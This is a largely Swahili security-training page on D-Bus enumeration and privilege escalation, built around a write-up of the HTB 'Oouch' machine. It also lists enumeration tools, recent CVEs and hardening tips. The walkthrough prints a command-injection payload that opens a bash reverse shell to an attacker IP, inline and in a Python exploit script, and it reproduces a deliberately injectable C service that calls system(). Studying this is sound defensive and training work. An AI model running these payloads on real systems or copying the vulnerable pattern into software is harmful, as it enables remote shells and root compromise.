# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus hutumika kama mpatanishi wa inter-process communications (IPC) katika mazingira ya Ubuntu desktop. Kwenye Ubuntu, kuna uendeshaji sambamba wa message buses kadhaa: system bus, ambayo hutumika hasa na **privileged services kufichua services zinazohusiana na mfumo mzima**, na session bus kwa kila user aliyeingia, ikifichua services zinazohusiana tu na user huyo husika. Hapa mkazo uko hasa kwenye system bus kwa sababu unahusiana na services zinazoendeshwa kwa higher privileges (kwa mfano, root) kwa kuwa lengo letu ni kuongeza privileges. Inaonekana kwamba architecture ya D-Bus hutumia 'router' kwa kila session bus, ambayo ina jukumu la kuelekeza client messages kwenda kwa services sahihi kulingana na address iliyobainishwa na clients kwa service wanayotaka kuwasiliana nayo.

Services kwenye D-Bus hufafanuliwa na **objects** na **interfaces** wanazofichua. Objects zinaweza kufananishwa na class instances katika lugha za kawaida za OOP, huku kila instance ikitambulishwa kwa kipekee na **object path**. Path hii, sawa na filesystem path, hutambulisha kwa kipekee kila object iliyofichuliwa na service. Interface muhimu kwa utafiti ni **org.freedesktop.DBus.Introspectable** interface, yenye method moja tu, Introspect. Method hii hurejesha uwakilishi wa XML wa methods, signals, na properties zinazotumika na object, huku hapa mkazo ukiwa kwenye methods na kuacha properties na signals.

Kwa mawasiliano na D-Bus interface, zilitumika tools mbili: CLI tool iitwayo **gdbus** kwa urahisi wa kuinvoke methods zilizofichuliwa na D-Bus katika scripts, na [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), tool ya GUI inayotegemea Python iliyoundwa kuenumerate services zinazopatikana kwenye kila bus na kuonyesha objects zilizo ndani ya kila service.
```bash
sudo apt-get install d-feet
```
Ikiwa unachunguza **session bus**, thibitisha kwanza anwani ya sasa:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Katika picha ya kwanza, huduma zilizosajiliwa na D-Bus system bus zinaonyeshwa, huku **org.debin.apt** ikiwa imeangaziwa mahsusi baada ya kuchagua kitufe cha System Bus. D-Feet huuliza huduma hii kuhusu objects, na kuonyesha interfaces, methods, properties, na signals za objects zilizochaguliwa, kama inavyoonekana kwenye picha ya pili. Signature ya kila method pia inaonyeshwa kwa undani.

Kipengele muhimu ni uonyeshaji wa **process ID (pid)** ya huduma na **command line**, jambo linalofaa kwa kuthibitisha kama huduma inaendeshwa kwa privileges zilizoinuliwa, muhimu kwa uhusiano wa utafiti.

**D-Feet pia inaruhusu method invocation**: watumiaji wanaweza kuingiza Python expressions kama parameters, ambazo D-Feet huzibadilisha kuwa D-Bus types kabla ya kuzipitisha kwa huduma.

Hata hivyo, kumbuka kuwa **methods fulani zinahitaji authentication** kabla ya kuturuhusu kuzinvoke. Tutapuuza methods hizi, kwa kuwa lengo letu ni kuinua privileges zetu bila credentials kwanza.

Pia kumbuka kuwa baadhi ya services huuliza huduma nyingine ya D-Bus inayoitwa org.freedeskto.PolicyKit1 kama user anapaswa kuruhusiwa kufanya actions fulani au la.

## **Cmd line Enumeration**

### List Service Objects

Inawezekana kuorodhesha opened D-Bus interfaces kwa:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Huduma zilizoandikwa kama **`(activatable)`** ni za kuvutia hasa kwa sababu **bado hazijaendeshwa**, lakini ombi la bus linaweza kuzianzisha unapozihitaji. Usisome tu `busctl list`; linganisha majina hayo na binaries halisi ambazo zingetekelezwa.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Hiyo hukwambia haraka ni njia gani ya `Exec=` itaanza kwa jina linaloweza kuamilishwa na chini ya utambulisho gani. Ikiwa binary au mnyororo wake wa utekelezaji imelindwa kwa udhaifu, huduma isiyofanya kazi bado inaweza kuwa njia ya privilege-escalation.

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wakati mchakato unapoweka connection kwenye bus, bus hugawa connection hiyo jina maalum la bus linaloitwa _unique connection name_. Majina ya bus ya aina hii hayabadiliki—imehakikishwa kuwa hayatabadilika mradi connection ipo—na, muhimu zaidi, hayawezi kutumiwa tena wakati wa maisha ya bus. Hii ina maana kwamba hakuna connection nyingine yoyote kwenye bus hiyo itakayowahi kupewa unique connection name kama hiyo, hata kama mchakato uleule utafunga connection kwenda kwenye bus na kuunda mpya. Unique connection names ni rahisi kutambua kwa sababu huanza na herufi ya koloni—ambayo vinginevyo hairuhusiwi.

### Service Object Info

Kisha, unaweza kupata taarifa fulani kuhusu interface kwa:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Pia pia jina la bus na `systemd` unit yake na njia ya executable:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Hii inajibu swali la kiutendaji linalohusika wakati wa privesc: **ikiwa method call inafanikiwa, ni binary na unit gani halisi itafanya hatua hiyo?**

### Orodhesha Interfaces za Service Object

Unahitaji kuwa na permissions za kutosha.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect Interface of a Service Object

Tambua jinsi katika mfano huu ilichaguliwa interface ya hivi karibuni iliyogunduliwa kwa kutumia parameter `tree` (_ona sehemu iliyotangulia_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Note the method `.Block` of the interface `htb.oouch.Block` (ile tunalopenda). Herufi "s" ya safu wima nyingine huenda ikimaanisha kwamba inatarajia string.

Kabla ya kujaribu chochote cha hatari, thibitisha kwanza njia ya **read-oriented** au njia nyingine yenye hatari ndogo. Hii hutenganisha hali tatu kwa uwazi: syntax isiyo sahihi, inafikiwa lakini imekataliwa, au inafikiwa na inaruhusiwa.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Correlate D-Bus Methods with Policies and Actions

Introspection inakuonyesha **nini** unaweza kuita, lakini haikuambii **kwa nini** wito unaruhusiwa au unakataliwa. Kwa triage ya kweli ya privesc kawaida unahitaji kukagua **tabaka tatu pamoja**:

1. **Activation metadata** (`.service` files or `SystemdService=`) ili kujua ni binary na unit gani itakayotumika kweli.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) ili kujua nani anaweza `own`, `send_destination`, au `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) ili kujua default authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Usidhani **1:1 mapping** kati ya D-Bus method na Polkit action. Method ileile inaweza kuchagua action tofauti kutegemea object inayobadilishwa au runtime context. Kwa hiyo workflow ya vitendo ni:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` na grep faili husika za `.policy`
3. low-risk live probes kwa `busctl call`, `gdbus call`, au `dbusmap --enable-probes --null-agent`

Proxy au compatibility services zinastahili umakini wa ziada. **root-running proxy** inayoforward requests kwenda D-Bus service nyingine kupitia connection yake yenyewe iliyowekwa mapema inaweza kwa bahati mbaya kufanya backend ichukulie kila request kama inatoka kwa UID 0 isipokuwa identity ya caller wa awali ihalalishwe tena.

### Monitor/Capture Interface

Kwa privileges za kutosha (just `send_destination` and `receive_sender` privileges aren't enough) unaweza **monitor D-Bus communication**.

Ili **monitor** **communication** utahitaji kuwa **root.** Ukiendelea kuona matatizo ukiwa root angalia [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) na [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Ikiwa unajua jinsi ya kusanidi D-Bus config file ili **kuruhusu non root users kusniff** communication tafadhali **wasiliana nami**!

Njia tofauti za monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Katika mfano ufuatao, interface `htb.oouch.Block` inafuatiliwa na **ujumbe "**_**lalalalal**_**" unatumwa kupitia mawasiliano mabaya**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Unaweza kutumia `capture` badala ya `monitor` kuhifadhi matokeo kwenye faili ya **pcapng** ambayo Wireshark inaweza kufungua:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Kuchuja kelele zote <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Ikiwa kuna taarifa nyingi sana kwenye bus, pitisha match rule kama hivi:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Sheria nyingi zinaweza kubainishwa. Ikiwa ujumbe unalingana na _lolote_ kati ya sheria, ujumbe utaonyeshwa. Kama hivi:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Tazama [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) kwa maelezo zaidi kuhusu match rule syntax.

### More

`busctl` ina chaguo zaidi, [**pata zote hapa**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

Kama user **qtc ndani ya host "oouch" kutoka HTB** unaweza kupata **unexpected D-Bus config file** iliyopo katika _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Kumbuka kutoka kwenye usanidi uliopita kwamba **utahitaji kuwa mtumiaji `root` au `www-data` ili kutuma na kupokea taarifa** kupitia mawasiliano haya ya D-BUS.

Kama mtumiaji **qtc** ndani ya docker container **aeb4525789d8** unaweza kupata baadhi ya code zinazohusiana na dbus katika faili _/code/oouch/routes.py._ Hii ndiyo code ya kuvutia:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Kama unavyoona, inajiunganisha na **D-Bus interface** na kutuma kwa **"Block" function** thamani ya "client_ip".

Upande wa pili wa connection ya D-Bus kuna binary fulani ya C iliyocompiled inayoendeshwa. Hii code inasikiliza katika connection ya D-Bus **kwa IP address na inaita iptables kupitia `system` function** ili ku-block IP address iliyotolewa.\
**Call ya `system` imewekwa kuwa vulnerable kwa makusudi kwa command injection**, hivyo payload kama ifuatayo itaunda reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Mwisho wa ukurasa huu unaweza kupata **complete C code of the D-Bus application**. Ndani yake unaweza kupata kati ya mistari 91-97 **jinsi `D-Bus object path`** na **`interface name`** zilivyo **registered**. Taarifa hii itahitajika ili kutuma taarifa kwenye connection ya D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Pia, katika mstari wa 57 unaweza kuona kwamba **njia pekee iliyosajiliwa** kwa mawasiliano haya ya D-Bus inaitwa `Block`(_**Ndiyo maana katika sehemu ifuatayo payloads zitatumwa kwa service object `htb.oouch.Block`, interface `/htb/oouch/Block` na method name `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Msimbo wa python ufuatao utatuma payload kwenye muunganisho wa D-Bus kwa `Block` method kupitia `block_iface.Block(runme)` (_note that it was extracted from the previous chunk of code_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl and dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` ni zana inayotumika kutuma ujumbe kwa “Message Bus”
- Message Bus – Programu inayotumiwa na mifumo ili kufanya mawasiliano kati ya applications kwa urahisi. Inahusiana na Message Queue (ujumbe hupangwa kwa mfululizo) lakini katika Message Bus ujumbe hutumwa katika modeli ya subscription na pia ni ya haraka sana.
- Tag “-system” hutumiwa kuonyesha kwamba huu ni ujumbe wa system, si session message (kwa default).
- Tag “–print-reply” hutumiwa kuchapisha ujumbe wetu ipasavyo na kupokea replies zozote katika muundo unaosomeka na binadamu.
- “–dest=Dbus-Interface-Block” Anwani ya Dbus interface.
- “–string:” – Aina ya ujumbe tunayotaka kutuma kwa interface. Kuna formats kadhaa za kutuma ujumbe kama double, bytes, booleans, int, objpath. Kati ya hizi, “object path” ni muhimu tunapotaka kutuma path ya file kwa Dbus interface. Tunaweza kutumia file maalum (FIFO) katika hali hii kupitisha command kwa interface kwa jina la file. “string:;” – Hii ni kuita object path tena ambapo tunaweka file/command ya FIFO reverse shell.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

Enumeration ya surface kubwa ya D-Bus kwa mikono kwa `busctl`/`gdbus` haraka huwa ya kuchosha. Vifaa viwili vidogo vya FOSS vilivyotolewa katika miaka michache iliyopita vinaweza kuharakisha kazi wakati wa red-team au CTF engagements:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Imeandikwa kwa C; single static binary (<50 kB) inayopita kila object path, kuchukua `Introspect` XML na kuimapa kwa owning PID/UID.
* Useful flags:
```bash
# Orodhesha kila service kwenye *system* bus na dumka methods zote zinazoweza kuitwa
sudo dbus-map --dump-methods

# Chunguza kwa bidii methods/properties unazoweza kufikia bila Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Tool hii huweka alama well-known names zisizo protected kwa `!`, mara moja ikionyesha services unazoweza *own* (take over) au method calls zinazofikiwa kutoka kwenye unprivileged shell.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Python-only script inayotafuta paths *writable* kwenye systemd units **na** D-Bus policy files zenye ruhusa kupita kiasi (mfano `send_destination="*"`).
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module hutafuta directories zilizo hapa chini na kuonyesha service yoyote inayoweza spoofed au hijacked na user wa kawaida:
* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

Kufuatilia CVEs zilizochapishwa hivi karibuni husaidia kubaini mifumo isiyo salama inayofanana kwenye custom code. Mifano miwili mizuri ya hivi karibuni ni:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Service inayoendeshwa na root ilifichua D-Bus interface ambayo users wasio na privileges wangeweza kuireconfigure, ikiwemo kupakia attacker-controlled macro behavior. | Ikiwa daemon inafichua **device/profile/config management** kwenye system bus, chukulia writable configuration na macro features kama code-execution primitives, si tu "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Root-running compatibility proxy ilipeleka requests kwa backend services bila kuhifadhi original caller's security context, hivyo backends zikamwamini proxy kama UID 0. | Chukulia **proxy / bridge / compatibility** D-Bus services kama bug class tofauti: ikiwa zinarelay privileged calls, hakikisha caller UID/Polkit context inafika vipi backend. |

Patterns to notice:
1. Service runs **as root on the system bus**.
2. Either there is **no authorization check**, or the check is performed against the **wrong subject**.
3. The reachable method eventually changes system state: package install, user/group changes, bootloader config, device profile updates, file writes, or direct command execution.

Use `dbusmap --enable-probes` or manual `busctl call` to confirm whether a method is reachable, then inspect the service's policy XML and Polkit actions to understand **which subject** is actually being authorized.

---

## Hardening & Detection Quick-Wins

* Search for world-writable or *send/receive*-open policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Require Polkit for dangerous methods – even *root* proxies should pass the *caller* PID to `polkit_authority_check_authorization_sync()` instead of their own.
* Drop privileges in long-running helpers (use `sd_pid_get_owner_uid()` to switch namespaces after connecting to the bus).
* If you cannot remove a service, at least *scope* it to a dedicated Unix group and restrict access in its XML policy.
* Blue-team: capture the system bus with `busctl capture > /var/log/dbus_$(date +%F).pcapng` and import it into Wireshark for anomaly detection.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
